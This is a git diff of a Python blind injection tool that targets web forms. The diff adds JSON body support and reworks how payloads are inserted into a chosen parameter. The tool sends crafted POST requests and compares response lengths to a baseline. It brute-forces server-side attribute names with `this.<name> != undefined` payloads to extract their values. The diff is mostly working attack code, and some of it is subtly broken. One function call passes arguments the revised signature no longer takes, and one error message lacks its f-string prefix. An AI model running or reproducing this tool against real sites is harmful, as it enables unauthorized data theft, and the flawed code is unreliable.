@@ -6,6 +6,7 @@ from urllib.parse import quote, urlparse
 import sys
 from objects import *
 
+
 def progress_bar(progress, total, bar_length=40):
     percent = float(progress) / total
     arrow = '=' * int(round(percent * bar_length) - 1) + '>'
@@ -14,21 +15,36 @@ def progress_bar(progress, total, bar_length=40):
     sys.stdout.write(f"\rProgress: [{arrow}{spaces}] {int(percent * 100)}%")
     sys.stdout.flush()
 
-def replace_param_value(query_string, param_name):
-    # Split the query string into individual parameters
-    params = query_string.split('&')
+def replace_param_value(parameters, request_body_type, param_name):
     
-    # Iterate through the parameters and replace the value of the specified param_name
-    updated_params = []
-    for param in params:
-        key, value = param.split('=') if '=' in param else (param, None)  # Split into key and value
-        if key == param_name:
-            updated_params.append(f"{key}=§{param_name}§")  # Replace value with §param_name§
-        else:
-            updated_params.append(param)  # Keep the original parameter unchanged
+    if request_body_type == PostRequestBodyType.FORM_URLENCODED:
+        
+        # Split the query string into individual parameters
+        params = parameters.split('&')
+        
+        # Iterate through the parameters and replace the value of the specified param_name
+        updated_params = []
+        for param in params:
+            key, value = param.split('=') if '=' in param else (param, None)  # Split into key and value
+            if key == param_name:
+                updated_params.append(f"{key}=§{param_name}§")  # Replace value with §param_name§
+            else:
+                updated_params.append(param)  # Keep the original parameter unchanged
 
-    # Join the updated parameters back into a query string
-    return '&'.join(updated_params)
+        # Join the updated parameters back into a query string
+        return '&'.join(updated_params)
+    elif request_body_type == PostRequestBodyType.JSON:
+        if not isinstance(parameters, dict):
+            raise Exception("Encountered JSON request_body_type but parameters are not in valid JSON format")
+        
+        if not param_name in parameters.keys():
+            raise Exception("Could not insert placeholder: Key {param_name} does not exist in JSON")
+        
+        parameters[param_name] = f"§{param_name}§"
+        return parameters
+                
+    else:
+        raise Exception(f"The request_body_type '{request_body_type}' can not be handled in this version.")
 
 def extract_form_data(url, scan_param_name):
     print(f"[+] Extracting form data from {url}")
@@ -87,11 +103,11 @@ def extract_form_data(url, scan_param_name):
     attack_target.parameters = attack_target.parameters.rstrip("&")
     return attack_target
 
-def get_baseline_response(attack_target, scan_param_name):
+def get_baseline_response(attack_target,debug=False):
     # get default response for random payload
-    default_response = get_random_payload_response(attack_target, scan_param_name)
+    default_response = get_random_payload_response(attack_target,debug=debug)
     # check if page is dynamic
-    default_response_2 = get_random_payload_response(attack_target, scan_param_name)
+    default_response_2 = get_random_payload_response(attack_target,debug=debug)
 
     if len(default_response.text) == len(default_response_2.text):
         print("[+] Form target page is not reflective")
@@ -155,9 +171,8 @@ def generate_random_string(length):
     random_string = ''.join(random.choices(characters, k=length))
     return random_string
 
-def get_random_payload_response(attack_target, scan_param_name):    
-    default_r_data = attack_target.parameters.replace(f"§{scan_param_name}§", generate_random_string(8))
-    default_response = send_post_request(attack_target, default_r_data)
+def get_random_payload_response(attack_target,debug=False):        
+    default_response = send_post_request(attack_target, generate_random_string(8),debug=debug)
     if not default_response:
         raise Exception(f"Default Response failed: {default_response.status_code}, {default_response.text}")
     return default_response
@@ -171,30 +186,41 @@ def print_results(found_attributes, results):
     for r in results:
         print(f"[+] {r[0]}:{r[1]}")
 
-def send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response, debug=False):
+def send_extraction_request(attack_target, extraction_point, extraction_payload,debug = False):
     # create payload by replacing injection point 
-    payload = extraction_point.replace("§inject§", extraction_payload)
-    # insert payload into request
-    r_data = attack_target.parameters.replace(f"§{insertion_param_name}§", quote(payload))
-    response = send_post_request(attack_target, r_data)
+    payload = extraction_point.replace("§inject§", extraction_payload)        
+    response = send_post_request(attack_target, payload,debug=debug)
     if response == None:
         raise Exception("Extraction response is None")
-    res = len(response.text) != len(default_response.text)
+    res = len(response.text) != len(attack_target.baseline_response)
     if debug:
-        print(attack_target.get_target_url(), r_data, res)
+        print(attack_target.get_target_url(), payload, res)
     return res
 
-def send_post_request(attack_target, r_data):
-    #print("Requesting:",r_url, r_data)
+def send_post_request(attack_target, payload, debug = False):
+    r_body_type = attack_target.request_body_type
+    
+    if r_body_type == PostRequestBodyType.JSON:
+        r_data = attack_target.parameters.copy()
+        r_data[attack_target.scan_param_name] = payload
+    elif r_body_type == PostRequestBodyType.FORM_URLENCODED:
+        r_data = attack_target.parameters.replace(f"§{attack_target.scan_param_name}§", quote(payload))
+    else:
+        raise Exception(f"The request_body_type '{r_body_type}' can not be handled in this version.")
+    
+    if debug:
+        print(attack_target.get_target_url(), r_data)
     r = requests.post(
         attack_target.get_target_url(),
         headers=attack_target.headers,
         cookies=attack_target.cookies,
         data=r_data,
     )    
+    if debug:
+        print(len(r.text), r.status_code, r.text)
     return r
 
-def brute_attribute_names(attack_target,insertion_param_name, default_response, extraction_point):
+def brute_attribute_names(attack_target, extraction_point):
     print(f"Brute Forcing attributes ...")
     # Brute Attributes
     with open("attributes.txt") as file:
@@ -202,12 +228,12 @@ def brute_attribute_names(attack_target,insertion_param_name, default_response, 
     if not attributes_list:
         print("Attributes list attributes.txt could not be found")
         exit()
-    attributes_list.add(insertion_param_name)
+    attributes_list.add(attack_target.scan_param_name)
     found_attributes = []    
     for a in attributes_list:       
         extraction_payload = f'this.{a} != undefined'        
-        if send_extraction_request(attack_target, extraction_point, extraction_payload, insertion_param_name, default_response):            
-            attr_length = get_extraction_parameter_length(attack_target,insertion_param_name, default_response, extraction_point, a)
+        if send_extraction_request(attack_target, extraction_point, extraction_payload, attack_target.scan_param_name, attack_target.baseline_response):            
+            attr_length = get_extraction_parameter_length(attack_target,attack_target.scan_param_name, attack_target.baseline_response, extraction_point, a)
             if attr_length:
                 found_attributes.append([a,attr_length])
                 print(f"\t[+] Found attribute: {a} with length {attr_length}")
